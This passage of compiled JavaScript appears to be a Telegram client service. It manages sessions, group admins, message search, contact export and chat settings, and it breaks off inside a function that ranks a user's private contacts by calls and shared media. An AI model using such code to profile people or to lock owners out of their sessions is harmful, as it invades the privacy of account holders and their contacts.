        if (options.exceptCurrent) {
            if (options.type === 'app') {
                await this.client.invoke(new telegram_1.Api.auth.ResetAuthorizations());
            }
            else {
                await this.client.invoke(new telegram_1.Api.account.ResetWebAuthorizations());
            }
            return true;
        }
        if (options.type === 'app') {
            await this.client.invoke(new telegram_1.Api.account.ResetAuthorization({
                hash: (0, big_integer_1.default)(options.hash)
            }));
        }
        else {
            await this.client.invoke(new telegram_1.Api.account.ResetWebAuthorization({
                hash: (0, big_integer_1.default)(options.hash)
            }));
        }
        return true;
    }
    async getChatStatistics(chatId, period) {
        if (!this.client)
            throw new Error('Client not initialized');
        const now = Math.floor(Date.now() / 1000);
        const periodInSeconds = {
            day: 24 * 60 * 60,
            week: 7 * 24 * 60 * 60,
            month: 30 * 24 * 60 * 60
        }[period];
        const messages = await this.client.getMessages(chatId, {
            limit: 100,
            offsetDate: now - periodInSeconds
        });
        const stats = {
            period,
            totalMessages: messages.length,
            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,
            messageTypes: {
                text: messages.filter(m => !m.media && m.message).length,
                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,
                video: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument')
                        return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');
                }).length,
                voice: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument')
                        return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');
                }).length,
                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length
            },
            topSenders: Object.entries(messages.reduce((acc, msg) => {
                const senderId = msg.fromId?.toString();
                if (senderId) {
                    acc[senderId] = (acc[senderId] || 0) + 1;
                }
                return acc;
            }, {}))
                .sort(([, a], [, b]) => b - a)
                .slice(0, 10)
                .map(([id, count]) => ({ id, count })),
            mostActiveHours: Object.entries(messages.reduce((acc, msg) => {
                const hour = new Date(msg.date * 1000).getHours();
                acc[hour] = (acc[hour] || 0) + 1;
                return acc;
            }, {}))
                .sort(([, a], [, b]) => b - a)
                .map(([hour, count]) => ({ hour: Number(hour), count }))
        };
        return stats;
    }
    getMediaExtension(media) {
        if (!media)
            return 'bin';
        switch (media.className) {
            case 'MessageMediaPhoto':
                return 'jpg';
            case 'MessageMediaDocument':
                const doc = media.document;
                if (!doc || !('mimeType' in doc))
                    return 'bin';
                const mime = doc.mimeType;
                if (mime?.startsWith('video/'))
                    return 'mp4';
                if (mime?.startsWith('image/'))
                    return mime.split('/')[1];
                if (mime?.startsWith('audio/'))
                    return 'ogg';
                return 'bin';
            default:
                return 'bin';
        }
    }
    getSearchFilter(filter) {
        switch (filter) {
            case 'photo': return new telegram_1.Api.InputMessagesFilterPhotos();
            case 'video': return new telegram_1.Api.InputMessagesFilterVideo();
            case 'document': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'url': return new telegram_1.Api.InputMessagesFilterUrl();
            case 'roundVideo': return new telegram_1.Api.InputMessagesFilterRoundVideo();
            case 'phtotoVideo': return new telegram_1.Api.InputMessagesFilterPhotoVideo();
            case 'voice': return new telegram_1.Api.InputMessagesFilterVoice();
            case 'roundVoice': return new telegram_1.Api.InputMessagesFilterRoundVoice();
            case 'gif': return new telegram_1.Api.InputMessagesFilterGif();
            case 'sticker': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'animation': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'music': return new telegram_1.Api.InputMessagesFilterMusic();
            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
            case 'location': return new telegram_1.Api.InputMessagesFilterGeo();
            case 'contact': return new telegram_1.Api.InputMessagesFilterContacts();
            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
            case 'phoneCalls': return new telegram_1.Api.InputMessagesFilterPhoneCalls({ missed: false });
            default: return new telegram_1.Api.InputMessagesFilterEmpty();
        }
    }
    getMediaType(media) {
        if (media instanceof telegram_1.Api.MessageMediaPhoto) {
            return 'photo';
        }
        else if (media instanceof telegram_1.Api.MessageMediaDocument) {
            const document = media.document;
            if (document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo)) {
                return 'video';
            }
            return 'document';
        }
        return 'document';
    }
    getEntityId(entity) {
        if (entity instanceof telegram_1.Api.User)
            return entity.id.toString();
        if (entity instanceof telegram_1.Api.Channel)
            return entity.id.toString();
        if (entity instanceof telegram_1.Api.Chat)
            return entity.id.toString();
        return '';
    }
    async addGroupMembers(groupId, members) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const users = await Promise.all(members.map(member => this.client.getInputEntity(member)));
        await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: channel,
            users
        }));
    }
    async removeGroupMembers(groupId, members) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        for (const member of members) {
            const user = await this.client.getInputEntity(member);
            await this.client.invoke(new telegram_1.Api.channels.EditBanned({
                channel: channel,
                participant: user,
                bannedRights: new telegram_1.Api.ChatBannedRights({
                    untilDate: 0,
                    viewMessages: true,
                    sendMessages: true,
                    sendMedia: true,
                    sendStickers: true,
                    sendGifs: true,
                    sendGames: true,
                    sendInline: true,
                    embedLinks: true
                })
            }));
        }
    }
    async promoteToAdmin(groupId, userId, permissions, rank) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new telegram_1.Api.ChatAdminRights({
                changeInfo: permissions?.changeInfo ?? false,
                postMessages: permissions?.postMessages ?? false,
                editMessages: permissions?.editMessages ?? false,
                deleteMessages: permissions?.deleteMessages ?? false,
                banUsers: permissions?.banUsers ?? false,
                inviteUsers: permissions?.inviteUsers ?? true,
                pinMessages: permissions?.pinMessages ?? false,
                addAdmins: permissions?.addAdmins ?? false,
                anonymous: permissions?.anonymous ?? false,
                manageCall: permissions?.manageCall ?? false,
                other: false
            }),
            rank: rank || ''
        }));
    }
    async demoteAdmin(groupId, userId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new telegram_1.Api.ChatAdminRights({
                changeInfo: false,
                postMessages: false,
                editMessages: false,
                deleteMessages: false,
                banUsers: false,
                inviteUsers: false,
                pinMessages: false,
                addAdmins: false,
                anonymous: false,
                manageCall: false,
                other: false
            }),
            rank: ''
        }));
    }
    async unblockGroupUser(groupId, userId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditBanned({
            channel: channel,
            participant: user,
            bannedRights: new telegram_1.Api.ChatBannedRights({
                untilDate: 0,
                viewMessages: false,
                sendMessages: false,
                sendMedia: false,
                sendStickers: false,
                sendGifs: false,
                sendGames: false,
                sendInline: false,
                embedLinks: false
            })
        }));
    }
    async getGroupAdmins(groupId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new telegram_1.Api.ChannelParticipantsAdmins(),
            offset: 0,
            limit: 100,
            hash: (0, big_integer_1.default)(0)
        }));
        if ('users' in result) {
            const participants = result.participants;
            const users = result.users;
            return participants.map(participant => {
                const adminRights = participant.adminRights;
                return {
                    userId: participant.userId.toString(),
                    rank: participant.rank || '',
                    permissions: {
                        changeInfo: adminRights.changeInfo || false,
                        postMessages: adminRights.postMessages || false,
                        editMessages: adminRights.editMessages || false,
                        deleteMessages: adminRights.deleteMessages || false,
                        banUsers: adminRights.banUsers || false,
                        inviteUsers: adminRights.inviteUsers || false,
                        pinMessages: adminRights.pinMessages || false,
                        addAdmins: adminRights.addAdmins || false,
                        anonymous: adminRights.anonymous || false,
                        manageCall: adminRights.manageCall || false
                    }
                };
            });
        }
        return [];
    }
    async getGroupBannedUsers(groupId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new telegram_1.Api.ChannelParticipantsBanned({ q: '' }),
            offset: 0,
            limit: 100,
            hash: (0, big_integer_1.default)(0)
        }));
        if ('users' in result) {
            const participants = result.participants;
            return participants.map(participant => {
                const bannedRights = participant.bannedRights;
                return {
                    userId: participant.peer.chatId.toString(),
                    bannedRights: {
                        viewMessages: bannedRights.viewMessages || false,
                        sendMessages: bannedRights.sendMessages || false,
                        sendMedia: bannedRights.sendMedia || false,
                        sendStickers: bannedRights.sendStickers || false,
                        sendGifs: bannedRights.sendGifs || false,
                        sendGames: bannedRights.sendGames || false,
                        sendInline: bannedRights.sendInline || false,
                        embedLinks: bannedRights.embedLinks || false,
                        untilDate: bannedRights.untilDate || 0
                    }
                };
            });
        }
        return [];
    }
    async searchMessages(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const finalResult = {
            video: { messages: [], total: 0 },
            photo: { messages: [], total: 0 },
            document: { messages: [], total: 0 },
            voice: { messages: [], total: 0 },
            text: { messages: [], total: 0 },
            all: { messages: [], total: 0 },
            roundVideo: { messages: [], total: 0 },
            roundVoice: { messages: [], total: 0 },
        };
        const { chatId, query = '', types, maxId, minId, limit } = params;
        console.log("Types: ", types);
        for (const type of types) {
            const filter = this.getSearchFilter(type);
            const queryFilter = {
                limit: limit || 500,
                ...(maxId ? { maxId } : {}),
                ...(minId ? { minId } : {}),
            };
            console.log(type, queryFilter);
            const searchQuery = {
                q: query,
                filter: filter,
                ...queryFilter,
                hash: (0, big_integer_1.default)(0),
            };
            let messages = [];
            let count = 0;
            console.log("Search Query: ", searchQuery);
            if (chatId) {
                searchQuery['peer'] = await this.safeGetEntity(chatId);
                console.log("Performing search in chat: ", chatId);
                const result = await this.client.invoke(new telegram_1.Api.messages.Search(searchQuery));
                if (!('messages' in result)) {
                    return {};
                }
                console.log(type, result?.messages?.length, result["count"]);
                count = result["count"] || 0;
                messages = result.messages;
            }
            else {
                console.log("Performing global search");
                const result = await this.client.invoke(new telegram_1.Api.messages.SearchGlobal({
                    ...searchQuery,
                    offsetRate: 0,
                    offsetPeer: new telegram_1.Api.InputPeerEmpty(),
                    offsetId: 0,
                    usersOnly: true
                }));
                if (!('messages' in result)) {
                    return {};
                }
                console.log(type, result?.messages?.length, result["count"]);
                count = result["count"] || 0;
                messages = result.messages;
            }
            if (types.includes(message_search_dto_1.MessageMediaType.TEXT) && types.length === 1) {
                console.log("Text Filter");
                messages = messages.filter((msg) => !('media' in msg));
            }
            const processedMessages = await Promise.all(messages.map(async (message) => {
                const unwantedTexts = [
                    'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',
                    'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',
                    'invite link', 'invitation', 'invitation link', 'customers', 'confirmation', 'earn', 'book', 'paper', 'pay',
                    'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray',
                    'mdisk', 'diskwala', 'tera', 'online', 'watch', 'click', 'episode', 'season', 'part', 'action',
                    'adventure', 'comedy', 'drama', 'fantasy', 'horror', 'mystery', 'romance', 'sci-fi', 'thriller',
                    'demo', 'dress', 'netlify', 'service', 'follow', 'like', 'comment', 'share', 'subscribe',
                    'premium', 'premium', 'unlock', 'access', 'exclusive', 'limited', 'offer', 'deal',
                    'discount', 'sale', 'free trial', 'free access', 'free download', 'free gift', 'freebie',
                    'crypto', 'currency', 'coin', 'blockchain', 'wallet', 'exchange', 'trading', 'investment',
                ];
                if (message.media && message.media instanceof telegram_1.Api.MessageMediaDocument) {
                    const document = message.media.document;
                    const fileNameAttr = document.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
                    const fileName = fileNameAttr && fileNameAttr instanceof telegram_1.Api.DocumentAttributeFilename ? fileNameAttr.fileName : '';
                    const fileNameText = fileName.toLowerCase();
                    const isWantedFile = !(0, utils_1.contains)(fileNameText, unwantedTexts);
                    return isWantedFile ? message.id : null;
                }
                else {
                    const messageText = (message.text || '').toLowerCase();
                    const containsFilteredContent = (0, utils_1.contains)(messageText, unwantedTexts);
                    return !containsFilteredContent ? message.id : null;
                }
            }));
            const filteredMessages = processedMessages.filter(id => id !== null);
            const localResult = {
                messages: filteredMessages,
                total: count ? count : filteredMessages.length
            };
            finalResult[`${type}`] = localResult;
        }
        return finalResult;
    }
    async getAllMediaMetaData(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { chatId, types = ['photo', 'video'], startDate, endDate, maxId, minId } = params;
        let allMedia = [];
        let hasMore = true;
        let lastOffsetId = 0;
        const limit = 200;
        while (hasMore) {
            const response = await this.getMediaMetadata({
                chatId,
                types,
                startDate,
                endDate,
                limit,
                maxId: lastOffsetId,
                minId
            });
            console.log("hasMore: ", response.hasMore, "Total: ", response.total, "lastOffsetId: ", response.lastOffsetId);
            allMedia = allMedia.concat(response.messages);
            if (!response.hasMore) {
                hasMore = false;
                console.log('No more messages to fetch');
            }
            else {
                lastOffsetId = response.lastOffsetId;
                console.log(`Fetched ${allMedia.length} messages so far`);
            }
            await (0, Helpers_1.sleep)(3000);
        }
        return {
            messages: allMedia,
            total: allMedia.length,
        };
    }
    async getFilteredMedia(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
        const query = {
            limit: limit || 100,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
        };
        const ent = await this.safeGetEntity(chatId);
        console.log(query);
        const messages = await this.client.getMessages(ent, query);
        console.log(`Fetched ${messages.length} messages`);
        const filteredMessages = messages.filter(message => {
            if (!message.media)
                return false;
            const mediaType = this.getMediaType(message.media);
            return types.includes(mediaType);
        });
        console.log(`Filtered down to ${filteredMessages.length} messages`);
        const mediaData = await Promise.all(filteredMessages.map(async (message) => {
            let thumbBuffer = null;
            try {
                if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                    const sizes = message.photo?.sizes || [1];
                    thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
                }
                else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                    const sizes = message.document?.thumbs || [1];
                    thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
                }
            }
            catch (error) {
                console.warn(`Failed to get thumbnail for message ${message.id}:`, error.message);
            }
            const mediaDetails = await this.getMediaDetails(message.media);
            return {
                messageId: message.id,
                type: this.getMediaType(message.media),
                thumb: thumbBuffer?.toString('base64') || null,
                caption: message.message || '',
                date: message.date,
                mediaDetails,
            };
        }));
        return {
            messages: mediaData,
            total: messages.total,
            hasMore: messages.length === limit
        };
    }
    async safeGetEntity(entityId) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            return await this.client.getEntity(entityId);
        }
        catch (error) {
            console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);
            try {
                const dialogs = await this.client.getDialogs({
                    limit: 300
                });
                for (const dialog of dialogs) {
                    const entity = dialog.entity;
                    if (entity.id.toString() === entityId.toString()) {
                        return entity;
                    }
                }
                console.log(`Entity ${entityId} not found in dialogs either`);
                return null;
            }
            catch (dialogError) {
                console.error('Error while searching dialogs:', dialogError);
                return null;
            }
        }
    }
    generateCSV(contacts) {
        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');
        const rows = contacts.map(contact => [
            contact.firstName,
            contact.lastName,
            contact.phone,
            contact.blocked
        ].join(','));
        return [header, ...rows].join('\n');
    }
    generateVCard(contacts) {
        return contacts.map(contact => {
            const vcard = [
                'BEGIN:VCARD',
                'VERSION:3.0',
                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),
                `TEL;TYPE=CELL:${contact.phone || ''}`,
                'END:VCARD'
            ];
            return vcard.join('\n');
        }).join('\n\n');
    }
    async exportContacts(format, includeBlocked = false) {
        if (!this.client)
            throw new Error('Client not initialized');
        const contactsResult = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];
        let blockedContacts;
        if (includeBlocked) {
            blockedContacts = await this.client.invoke(new telegram_1.Api.contacts.GetBlocked({
                offset: 0,
                limit: 100
            }));
        }
        if (format === 'csv') {
            const csvData = contacts.map((contact) => ({
                firstName: contact.firstName || '',
                lastName: contact.lastName || '',
                phone: contact.phone || '',
                blocked: blockedContacts ? blockedContacts.peers.some((p) => p.id.toString() === contact.id.toString()) : false
            }));
            return this.generateCSV(csvData);
        }
        else {
            return this.generateVCard(contacts);
        }
    }
    async importContacts(data) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = await Promise.all(data.map(async (contact) => {
            try {
                await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                    contacts: [new telegram_1.Api.InputPhoneContact({
                            clientId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000)),
                            phone: contact.phone,
                            firstName: contact.firstName,
                            lastName: contact.lastName || ''
                        })]
                }));
                return { success: true, phone: contact.phone };
            }
            catch (error) {
                return { success: false, phone: contact.phone, error: error.message };
            }
        }));
        return results;
    }
    async manageBlockList(userIds, block) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = await Promise.all(userIds.map(async (userId) => {
            try {
                if (block) {
                    await this.client.invoke(new telegram_1.Api.contacts.Block({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                else {
                    await this.client.invoke(new telegram_1.Api.contacts.Unblock({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                return { success: true, userId };
            }
            catch (error) {
                return { success: false, userId, error: error.message };
            }
        }));
        return results;
    }
    async getContactStatistics() {
        if (!this.client)
            throw new Error('Client not initialized');
        const contactsResult = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];
        const onlineContacts = contacts.filter((c) => c.status && 'wasOnline' in c.status);
        return {
            total: contacts.length,
            online: onlineContacts.length,
            withPhone: contacts.filter((c) => c.phone).length,
            mutual: contacts.filter((c) => c.mutual).length,
            lastWeekActive: onlineContacts.filter((c) => {
                const lastSeen = new Date(c.status.wasOnline * 1000);
                const weekAgo = new Date();
                weekAgo.setDate(weekAgo.getDate() - 7);
                return lastSeen > weekAgo;
            }).length
        };
    }
    async createChatFolder(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const folder = new telegram_1.Api.DialogFilter({
            id: Math.floor(Math.random() * 1000),
            title: new telegram_1.Api.TextWithEntities({
                text: options.name,
                entities: []
            }),
            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),
            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),
            pinnedPeers: [],
            contacts: options.includeContacts ?? true,
            nonContacts: options.includeNonContacts ?? true,
            groups: options.includeGroups ?? true,
            broadcasts: options.includeBroadcasts ?? true,
            bots: options.includeBots ?? true,
            excludeMuted: options.excludeMuted ?? false,
            excludeRead: options.excludeRead ?? false,
            excludeArchived: options.excludeArchived ?? false
        });
        await this.client.invoke(new telegram_1.Api.messages.UpdateDialogFilter({
            id: folder.id,
            filter: folder
        }));
        return {
            id: folder.id,
            name: options.name,
            options: {
                includeContacts: folder.contacts,
                includeNonContacts: folder.nonContacts,
                includeGroups: folder.groups,
                includeBroadcasts: folder.broadcasts,
                includeBots: folder.bots,
                excludeMuted: folder.excludeMuted,
                excludeRead: folder.excludeRead,
                excludeArchived: folder.excludeArchived
            }
        };
    }
    async getChatFolders() {
        if (!this.client)
            throw new Error('Client not initialized');
        const filters = await this.client.invoke(new telegram_1.Api.messages.GetDialogFilters());
        return (filters.filters || []).map((filter) => ({
            id: filter.id ?? 0,
            title: filter.title ?? '',
            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,
            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0
        }));
    }
    async sendMediaBatch(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const mediaFiles = await Promise.all(options.media.map(async (item) => {
            const buffer = await this.downloadFileFromUrl(item.url);
            const file = new uploads_1.CustomFile(item.fileName || `media.${this.getMediaExtension(item.type)}`, buffer.length, 'media', buffer);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });
            const inputMedia = item.type === 'photo' ?
                new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new telegram_1.Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(item.type),
                    attributes: this.getMediaAttributes(item)
                });
            return new telegram_1.Api.InputSingleMedia({
                media: inputMedia,
                message: item.caption || '',
                entities: []
            });
        }));
        return this.client.invoke(new telegram_1.Api.messages.SendMultiMedia({
            peer: options.chatId,
            multiMedia: mediaFiles,
            silent: options.silent,
            scheduleDate: options.scheduleDate
        }));
    }
    getMimeType(type) {
        switch (type) {
            case 'photo': return 'image/jpeg';
            case 'video': return 'video/mp4';
            case 'document': return 'application/octet-stream';
            default: return 'application/octet-stream';
        }
    }
    getMediaAttributes(item) {
        const attributes = [];
        if (item.fileName) {
            attributes.push(new telegram_1.Api.DocumentAttributeFilename({
                fileName: item.fileName
            }));
        }
        if (item.type === 'video') {
            attributes.push(new telegram_1.Api.DocumentAttributeVideo({
                duration: 0,
                w: 1280,
                h: 720,
                supportsStreaming: true
            }));
        }
        return attributes;
    }
    async editMessage(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        if (options.media) {
            const buffer = await this.downloadFileFromUrl(options.media.url);
            const file = new uploads_1.CustomFile(`media.${this.getMediaExtension(options.media.type)}`, buffer.length, 'media', buffer);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });
            const inputMedia = options.media.type === 'photo' ?
                new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new telegram_1.Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(options.media.type),
                    attributes: this.getMediaAttributes(options.media)
                });
            return this.client.invoke(new telegram_1.Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                media: inputMedia,
                message: options.text || ''
            }));
        }
        if (options.text) {
            return this.client.invoke(new telegram_1.Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                message: options.text
            }));
        }
        throw new Error('Either text or media must be provided');
    }
    async getChats(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const dialogs = await this.client.getDialogs({
            ...options,
            limit: options.limit || 100
        });
        return Promise.all(dialogs.map(async (dialog) => {
            const entity = dialog.entity;
            return {
                id: entity.id.toString(),
                title: 'title' in entity ? entity.title : null,
                username: 'username' in entity ? entity.username : null,
                type: entity instanceof telegram_1.Api.User ? 'user' :
                    entity instanceof telegram_1.Api.Chat ? 'group' :
                        entity instanceof telegram_1.Api.Channel ? 'channel' : 'unknown',
                unreadCount: dialog.unreadCount,
                lastMessage: dialog.message ? {
                    id: dialog.message.id,
                    text: dialog.message.message,
                    date: new Date(dialog.message.date * 1000)
                } : null
            };
        }));
    }
    async updateChatSettings(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const chat = await this.client.getEntity(settings.chatId);
        const updates = [];
        if (settings.title) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.EditTitle({
                channel: chat,
                title: settings.title
            })));
        }
        if (settings.about) {
            updates.push(this.client.invoke(new telegram_1.Api.messages.EditChatAbout({
                peer: chat,
                about: settings.about
            })));
        }
        if (settings.photo) {
            const buffer = await this.downloadFileFromUrl(settings.photo);
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });
            updates.push(this.client.invoke(new telegram_1.Api.channels.EditPhoto({
                channel: chat,
                photo: new telegram_1.Api.InputChatUploadedPhoto({
                    file: file
                })
            })));
        }
        if (settings.slowMode !== undefined) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
                channel: chat,
                seconds: settings.slowMode
            })));
        }
        if (settings.linkedChat) {
            const linkedChannel = await this.client.getEntity(settings.linkedChat);
            updates.push(this.client.invoke(new telegram_1.Api.channels.SetDiscussionGroup({
                broadcast: chat,
                group: linkedChannel
            })));
        }
        if (settings.username) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.UpdateUsername({
                channel: chat,
                username: settings.username
            })));
        }
        await Promise.all(updates);
        return true;
    }
    async getMessageStats(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const now = options.fromDate || new Date();
        const startDate = new Date(now);
        switch (options.period) {
            case 'day':
                startDate.setDate(startDate.getDate() - 1);
                break;
            case 'week':
                startDate.setDate(startDate.getDate() - 7);
                break;
            case 'month':
                startDate.setMonth(startDate.getMonth() - 1);
                break;
        }
        const messages = await this.client.getMessages(options.chatId, {
            limit: 100,
            offsetDate: Math.floor(now.getTime() / 1000),
        });
        const stats = {
            total: messages.length,
            withMedia: 0,
            withLinks: 0,
            withForwards: 0,
            byHour: new Array(24).fill(0),
            byType: {
                text: 0,
                photo: 0,
                video: 0,
                document: 0,
                other: 0
            }
        };
        for (const msg of messages) {
            const hour = new Date(msg.date * 1000).getHours();
            stats.byHour[hour]++;
            if (msg.media) {
                stats.withMedia++;
                const mediaType = this.getMediaType(msg.media);
                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;
            }
            else if (msg.message) {
                if (msg.message.match(/https?:\/\/[^\s]+/)) {
                    stats.withLinks++;
                }
                stats.byType.text++;
            }
            if (msg.fwdFrom) {
                stats.withForwards++;
            }
        }
        return stats;
    }
    async getTopPrivateChats() {
        if (!this.client)
            throw new Error('Client not initialized');
        console.log('Starting getTopPrivateChats analysis...');
        const startTime = Date.now();
        const weights = {
            videoCall: 15,
            incoming: 5,
            outgoing: 1,
            sharedVideo: 6,
            sharedPhoto: 4,
            textMessage: 1,
        };
        console.log('Fetching dialogs...');
        const dialogs = await this.client.getDialogs({
            limit: 200
        });
        console.log(`Found ${dialogs.length} total dialogs`);
        const privateChats = dialogs.filter(dialog => dialog.isUser &&
            dialog.entity instanceof telegram_1.Api.User &&
            !dialog.entity.bot &&
            !dialog.entity.fake &&
            dialog.entity.id.toString() !== "777000" &&
            dialog.entity.id.toString() !== "42777");
        console.log(`Found ${privateChats.length} valid private chats after filtering`);
        const now = Math.floor(Date.now() / 1000);
        const batchSize = 10;
        const chatStats = [];
        const callLogs = await this.getCallLogsInternal();
        console.log(callLogs);
        for (let i = 0; i < privateChats.length; i += batchSize) {
            console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);
            const batch = privateChats.slice(i, i + batchSize);
            const batchResults = await Promise.all(batch.map(async (dialog) => {
                const processingStart = Date.now();
                const chatId = dialog.entity.id.toString();
                const user = dialog.entity;
                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'}) last: ${dialog.message.id}`);
                try {
                    const messages = await this.client.getMessages(chatId, {
                        limit: 30,
                    });
                    if (messages.length < 20) {
                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);
                        return null;
                    }
                    const messageStats = await this.searchMessages({ chatId, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.CHAT_PHOTO], limit: 100 });
                    console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);
                    const callStats = {
                        total: 0,
                        incoming: 0,
                        outgoing: 0,
                        video: 0
                    };
                    const mediaStats = { photos: messageStats.photo.total, videos: messageStats?.video?.total || 0 + messageStats?.roundVideo?.total || 0 };
                    const userCalls = callLogs[chatId];
                    console.log(userCalls);
                    if (userCalls) {
                        callStats.total = userCalls.totalCalls;
                        callStats.incoming = userCalls.incoming;
                        callStats.outgoing = userCalls.outgoing;
                    }
                    const interactionScore = (callStats.incoming * weights.incoming +
                        callStats.outgoing * weights.outgoing +
                        callStats.video * weights.videoCall +
                        mediaStats.videos * weights.sharedVideo +
                        mediaStats.photos * weights.sharedPhoto +
                        messages.total * weights.textMessage);
                    const activityBreakdown = {
                        videoCalls: (callStats.video * weights.videoCall) / interactionScore * 100,
                        incoming: (callStats.incoming * weights.incoming) / interactionScore * 100,
                        outgoing: (callStats.outgoing * weights.outgoing) / interactionScore * 100,
                        mediaSharing: ((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto)) / interactionScore * 100,
                        textMessages: (messages.total * weights.textMessage) / interactionScore * 100
                    };
                    const processingTime = Date.now() - processingStart;
                    console.log(`Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);
                    return {
                        chatId,
                        username: user.username,
                        firstName: user.firstName,
                        lastName: user.lastName,
                        totalMessages: messages.total,
                        interactionScore: Math.round(interactionScore * 100) / 100,
                        calls: callStats,
                        media: mediaStats,
                        activityBreakdown
                    };
                }
                catch (error) {
